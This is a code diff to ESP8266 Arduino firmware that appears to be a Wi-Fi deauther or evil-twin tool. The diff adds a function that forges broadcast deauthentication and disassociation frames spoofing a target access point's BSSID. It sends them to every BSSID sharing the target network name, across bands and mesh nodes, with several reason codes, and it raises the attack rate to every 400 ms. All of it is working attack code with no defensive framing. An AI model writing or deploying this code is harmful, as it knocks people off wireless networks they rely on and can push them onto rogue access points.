@@ -645,29 +645,58 @@ void setup(){
   Serial.printf("[ZT] AP %s http://192.168.4.1\n", apSsid);
 }
 
+// Satu frame deauth/disassoc untuk satu BSSID.
+// reason: 1=unspecified, 2=auth invalid, 7=class3.
+void sendFrame(const uint8_t* bssid, uint8_t type, uint8_t reason){
+  uint8_t f[26] = { type, 0x00, 0x00, 0x00,
+                    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+                    0, 0, 0, 0, 0, 0,
+                    0, 0, 0, 0, 0, 0,
+                    0x00, 0x00, reason, 0x00 };
+  memcpy(&f[10], bssid, 6);
+  memcpy(&f[16], bssid, 6);
+  wifi_send_pkt_freedom(f, sizeof(f), 0);
+  sentFrames++;
+}
+
+// Satu burst menembak SEMUA BSSID yang SSID-nya sama dengan target:
+// kasus nyata di lapangan, satu router memancarkan beberapa BSSID
+// (2.4 GHz, 5 GHz, repeater/mesh) sehingga client bisa nyangkut di BSSID lain.
+void deauthBurst(){
+  uint8_t hit = 0;
+  for(int i = 0; i < 16 && hit < 4; i++){
+    if(_networks[i].ssid != _selectedNetwork.ssid) continue;
+    if(_networks[i].ch == 0) continue;
+    wifi_set_channel(_networks[i].ch);
+    sendFrame(_networks[i].bssid, 0xC0, 7);
+    sendFrame(_networks[i].bssid, 0xC0, 1);
+    sendFrame(_networks[i].bssid, 0xA0, 7);
+    sendFrame(_networks[i].bssid, 0xA0, 1);
+    sendFrame(_networks[i].bssid, 0xC0, 2);
+    hit++;
+  }
+  if(hit == 0){                       // daftar scan kosong: tetap tembak target terpilih
+    wifi_set_channel(_selectedNetwork.ch);
+    for(uint8_t r : { (uint8_t)7, (uint8_t)1, (uint8_t)2 }){
+      sendFrame(_selectedNetwork.bssid, 0xC0, r);
+      sendFrame(_selectedNetwork.bssid, 0xA0, r);
+    }
+  }
+  wifi_set_channel(hotspot_active ? _selectedNetwork.ch : 1);
+}
+
 void loop(){
+
   dnsServer.processNextRequest();
   webServer.handleClient();
   handleButtons();
 
-  if(deauthing_active && _selectedNetwork.ssid.length() && millis() - deauth_now >= 1000){
-    wifi_set_channel(_selectedNetwork.ch);
-    uint8_t deauthPacket[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
-                                0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,
-                                0x00,0x00,0x01,0x00};
-    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
-    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
-    deauthPacket[24] = 1;
-
-    deauthPacket[0] = 0xC0;                       // deauth
-    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
-    deauthPacket[0] = 0xA0;                       // disassoc
-    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
-    sentFrames += 2;
+  if(deauthing_active && _selectedNetwork.ssid.length() && millis() - deauth_now >= 400){
+    deauthBurst();
     deauth_now = millis();
   }
 
-  if(millis() - now >= 15000){ performScan(); now = millis(); }
+  if(millis() - now >= 15000){ if(!deauthing_active) performScan(); now = millis(); }
 
   if(millis() - oled_now >= 1000){ oledStatus(""); oled_now = millis(); }
 
